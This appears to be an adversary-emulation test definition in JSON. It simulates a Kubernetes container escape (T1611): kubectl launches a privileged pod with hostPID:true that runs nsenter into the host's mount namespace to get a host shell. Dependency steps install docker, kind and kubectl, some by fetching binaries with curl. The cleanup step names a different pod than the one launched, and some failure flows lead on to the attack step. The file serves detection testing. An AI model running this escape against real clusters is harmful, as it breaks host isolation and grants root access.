{
  "id": "0b2f9520-a17a-4671-9dba-3bd034099fff",
  "name": "Deploy container using nsenter container escape",
  "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n",
  "platforms": [
    "containers"
  ],
  "steps": [
    {
      "id": "0a949fc4-7c32-4521-a831-5fb1c640f590",
      "type": "execute-command",
      "data": {
        "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "e9fa26d4-3843-4426-8e04-a2e6cd1c9482",
      "type": "execute-command",
      "data": {
        "command": "kubectl --context kind-atomic-cluster delete pod atomic-escape-pod",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "ccadd758-c690-4431-a913-67e69128ebaf",
      "name": "Check dependency 1/5",
      "description": "Verify docker is installed.",
      "type": "execute-command",
      "data": {
        "command": "which docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "896368f9-e6e9-489a-9377-aa753dae7331",
      "name": "Resolve dependency 1/5",
      "description": "Verify docker is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "ab703eee-67ed-4f22-889e-266e69189430",
      "name": "Re-check dependency 1/5",
      "description": "Verify docker is installed.",
      "type": "execute-command",
      "data": {
        "command": "which docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "e13a72a5-6c22-4a54-8e6c-07561d4958f1",
      "name": "Check dependency 2/5",
      "description": "Verify docker service is running.",
      "type": "execute-command",
      "data": {
        "command": "sudo systemctl status docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "2b4a00b6-0d48-40ec-b0a0-f5bf7b9fa6cd",
      "name": "Resolve dependency 2/5",
      "description": "Verify docker service is running.",
      "type": "execute-command",
      "data": {
        "command": "sudo systemctl start docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "4b21905b-5319-4fee-a31e-7508cc60b00f",
      "name": "Re-check dependency 2/5",
      "description": "Verify docker service is running.",
      "type": "execute-command",
      "data": {
        "command": "sudo systemctl status docker",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "20526942-d133-4c3e-b34b-cf0885550bb0",
      "name": "Check dependency 3/5",
      "description": "Verify kind is in the path.",
      "type": "execute-command",
      "data": {
        "command": "which kind",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "9ff9043d-57eb-4460-b97d-53f30ca15dfa",
      "name": "Resolve dependency 3/5",
      "description": "Verify kind is in the path.",
      "type": "execute-command",
      "data": {
        "command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "88a393a1-0605-493e-9c37-1efb25c6a26b",
      "name": "Re-check dependency 3/5",
      "description": "Verify kind is in the path.",
      "type": "execute-command",
      "data": {
        "command": "which kind",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "c8a7d77f-1a0f-45a0-af1d-f6c757c84023",
      "name": "Check dependency 4/5",
      "description": "Verify kind-atomic-cluster is created",
      "type": "execute-command",
      "data": {
        "command": "sudo kind get clusters",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "a8855ca5-eb7e-4066-ba42-03861e209bfd",
      "name": "Resolve dependency 4/5",
      "description": "Verify kind-atomic-cluster is created",
      "type": "execute-command",
      "data": {
        "command": "sudo kind create cluster --name atomic-cluster",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "bdd36e40-6b00-486a-a325-517fd2ecaa1b",
      "name": "Re-check dependency 4/5",
      "description": "Verify kind-atomic-cluster is created",
      "type": "execute-command",
      "data": {
        "command": "sudo kind get clusters",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "be5a0081-e6d1-488b-b4c0-3144d077561c",
      "name": "Check dependency 5/5",
      "description": "Verify kubectl is in path",
      "type": "execute-command",
      "data": {
        "command": "which kubectl",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "656d5585-3ab3-4b99-bed9-2e23c2aaae8f",
      "name": "Resolve dependency 5/5",
      "description": "Verify kubectl is in path",
      "type": "execute-command",
      "data": {
        "command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "651a4e11-6e83-4190-8be4-a5091c94b123",
      "name": "Re-check dependency 5/5",
      "description": "Verify kubectl is in path",
      "type": "execute-command",
      "data": {
        "command": "which kubectl",
        "command_type": "sh"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "0a949fc4-7c32-4521-a831-5fb1c640f590",
      "p": "on-success",
      "o": "e9fa26d4-3843-4426-8e04-a2e6cd1c9482"
    },
    {
      "s": "0a949fc4-7c32-4521-a831-5fb1c640f590",
      "p": "on-failure",
      "o": "e9fa26d4-3843-4426-8e04-a2e6cd1c9482"
    },
    {
      "s": "ccadd758-c690-4431-a913-67e69128ebaf",
      "p": "on-success",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    },
    {
      "s": "ccadd758-c690-4431-a913-67e69128ebaf",
      "p": "on-failure",
      "o": "896368f9-e6e9-489a-9377-aa753dae7331"
    },
    {
      "s": "896368f9-e6e9-489a-9377-aa753dae7331",
      "p": "on-success",
      "o": "ab703eee-67ed-4f22-889e-266e69189430"
    },
    {
      "s": "ab703eee-67ed-4f22-889e-266e69189430",
      "p": "on-failure",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    },
    {
      "s": "e13a72a5-6c22-4a54-8e6c-07561d4958f1",
      "p": "on-success",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    },
    {
      "s": "e13a72a5-6c22-4a54-8e6c-07561d4958f1",
      "p": "on-failure",
      "o": "2b4a00b6-0d48-40ec-b0a0-f5bf7b9fa6cd"
    },
    {
      "s": "2b4a00b6-0d48-40ec-b0a0-f5bf7b9fa6cd",
      "p": "on-success",
      "o": "4b21905b-5319-4fee-a31e-7508cc60b00f"
    },
    {
      "s": "4b21905b-5319-4fee-a31e-7508cc60b00f",
      "p": "on-failure",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    },
    {
      "s": "20526942-d133-4c3e-b34b-cf0885550bb0",
      "p": "on-success",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    },
    {
      "s": "20526942-d133-4c3e-b34b-cf0885550bb0",
      "p": "on-failure",
      "o": "9ff9043d-57eb-4460-b97d-53f30ca15dfa"
    },
    {
      "s": "9ff9043d-57eb-4460-b97d-53f30ca15dfa",
      "p": "on-success",
      "o": "88a393a1-0605-493e-9c37-1efb25c6a26b"
    },
    {
      "s": "88a393a1-0605-493e-9c37-1efb25c6a26b",
      "p": "on-failure",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    },
    {
      "s": "c8a7d77f-1a0f-45a0-af1d-f6c757c84023",
      "p": "on-success",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    },
    {
      "s": "c8a7d77f-1a0f-45a0-af1d-f6c757c84023",
      "p": "on-failure",
      "o": "a8855ca5-eb7e-4066-ba42-03861e209bfd"
    },
    {
      "s": "a8855ca5-eb7e-4066-ba42-03861e209bfd",
      "p": "on-success",
      "o": "bdd36e40-6b00-486a-a325-517fd2ecaa1b"
    },
    {
      "s": "bdd36e40-6b00-486a-a325-517fd2ecaa1b",
      "p": "on-failure",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    },
    {
      "s": "be5a0081-e6d1-488b-b4c0-3144d077561c",
      "p": "on-success",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    },
    {
      "s": "be5a0081-e6d1-488b-b4c0-3144d077561c",
      "p": "on-failure",
      "o": "656d5585-3ab3-4b99-bed9-2e23c2aaae8f"
    },
    {
      "s": "656d5585-3ab3-4b99-bed9-2e23c2aaae8f",
      "p": "on-success",
      "o": "651a4e11-6e83-4190-8be4-a5091c94b123"
    },
    {
      "s": "651a4e11-6e83-4190-8be4-a5091c94b123",
      "p": "on-failure",
      "o": "0a949fc4-7c32-4521-a831-5fb1c640f590"
    }
  ],
  "tags": [
    "T1611"
  ]
}